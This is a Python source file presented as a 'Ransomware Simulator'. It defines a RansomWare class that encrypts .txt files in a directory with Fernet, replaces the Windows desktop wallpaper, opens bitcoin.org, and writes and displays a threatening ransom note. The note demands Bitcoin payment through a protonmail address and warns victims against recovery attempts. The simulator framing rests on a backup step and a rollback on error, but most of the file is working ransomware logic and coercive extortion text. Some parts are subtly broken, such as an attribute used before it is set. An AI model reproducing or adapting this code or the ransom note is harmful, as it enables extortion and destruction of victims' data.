import os
import shutil
import webbrowser
import ctypes
import urllib.request
import time
import datetime
import subprocess
from cryptography.fernet import Fernet

class RansomWare:
    file_exts = ['.txt']

    def __init__(self, target_dir):
        self.target_dir = target_dir
        self.key = None
        self.encrypted_files = {}

    def generate_key(self):
        self.key = Fernet.generate_key()

    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_files(self):
        fernet = Fernet(self.key)
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(tuple(self.file_exts)):
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    self.encrypted_files[file_path] = encrypted_data

    def decrypt_files(self):
        fernet = Fernet(self.key)
        for file_path, data in self.encrypted_files.items():
            decrypted_data = fernet.decrypt(data)
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)

    def backup_files(self, backup_dir):
        try:
            shutil.copytree(self.target_dir, backup_dir)
            print(f"Backup created successfully at {backup_dir}")
        except Exception as e:
            print(f"Backup failed: {e}")

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        try:
            image_url = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
            path = os.path.join(os.path.expanduser('~'), 'Desktop', 'background.jpg')
            urllib.request.urlretrieve(image_url, path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        except Exception as e:
            print(f"Error changing desktop background: {e}")

    def ransom_note(self):
        try:
            date = datetime.date.today().strftime('%d-%B-%Y')
            note_content = f'''The hard disks of your computer have been encrypted with a military-grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will receive your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been made.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place the text file on the desktop and wait. Shortly after, it will begin to decrypt all files.

WARNING:
- Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
- Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files and there is a high chance you will lose your files forever.
- Do NOT send the "PAID" button without paying; the price WILL go up for disobedience.
- Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
'''
            with open('RANSOM_NOTE.txt', 'w') as f:
                f.write(note_content)
        except Exception as e:
            print(f"Error creating ransom note: {e}")

    def show_ransom_note(self):
        try:
            subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            count = 0
            while count < 5:
                time.sleep(10)
                count += 1
        except Exception as e:
            print(f"Error displaying ransom note: {e}")

    def put_me_on_desktop(self):
        try:
            print('Started')
            while True:
                with open(os.path.join(os.path.expanduser('~'), 'Desktop', 'PUT_ME_ON_DESKTOP.txt'), 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    print('Decrypted')
                    break
                time.sleep(10)
                print('Checking for PUT_ME_ON_DESKTOP.txt')
        except Exception as e:
            print(f"Error putting decryption key on desktop: {e}")

    def crypt_file(self, file_path, encrypted=False):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                if not encrypted:
                    _data = self.crypter.encrypt(data)
                else:
                    _data = self.crypter.decrypt(data)
            with open(file_path, 'wb') as fp:
                fp.write(_data)
        except Exception as e:
            print(f"Error encrypting/decrypting file {file_path}: {e}")

    def crypt_system(self, encrypted=False):
        try:
            system = os.walk(self.target_dir, topdown=True)
            for root, dirs, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if not file.endswith(tuple(self.file_exts)):
                        continue
                    if not encrypted:
                        self.crypt_file(file_path)
                    else:
                        self.crypt_file(file_path, encrypted=True)
        except Exception as e:
            print(f"Error encrypting/decrypting system: {e}")

def main():
    try:
        print("Welcome to the Ransomware Simulator!")

        target_directory = input("Enter the target directory to encrypt/decrypt files: ")
        backup_directory = input("Enter the directory to store backup files: ")

        # Check if the target directory exists
        if not os.path.exists(target_directory):
            raise FileNotFoundError(f"The target directory '{target_directory}' does not exist.")

        # Create the backup directory if it doesn't exist
        if not os.path.exists(backup_directory):
            os.makedirs(backup_directory)
            print(f"Backup directory '{backup_directory}' created successfully.")

        # Backup the target directory before encryption
        rw = RansomWare(target_directory)
        rw.backup_files(backup_directory)
        print("Backup completed successfully!")

        # Generate a random key for encryption
        rw.generate_key()
        print("Encryption key generated successfully.")

        # Encrypt files in the target directory
        rw.encrypt_files()
        print("Files encrypted successfully!")

        # Write the encryption key to a file
        rw.write_key()
        print("Encryption key written to file.")

        # Change the desktop background to a ransom note
        rw.change_desktop_background()
        print("Desktop background changed to display the ransom note.")

        # Open a web browser to educate the victim about Bitcoin
        rw.what_is_bitcoin()
        print("Web browser opened to educate about Bitcoin.")

        # Generate a ransom note for the victim
        rw.ransom_note()
        print("Ransom note created successfully!")

        # Display the ransom note on the victim's screen
        rw.show_ransom_note()
        print("Ransom note displayed successfully!")

        # Wait for the victim to place the decryption key file on the desktop
        rw.put_me_on_desktop()
        print("Decryption key obtained successfully!")

        # Decrypt files in the target directory using the obtained key
        rw.decrypt_files()
        print("Files decrypted successfully!")

        print("Ransomware attack completed successfully!")
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        # Rollback changes if an error occurs
        if os.path.exists(backup_directory):
            shutil.rmtree(target_directory)
            shutil.move(backup_directory, target_directory)
            print("Rollback completed successfully.")
        print("Ransomware attack failed.")

if __name__ == '__main__':
    main()
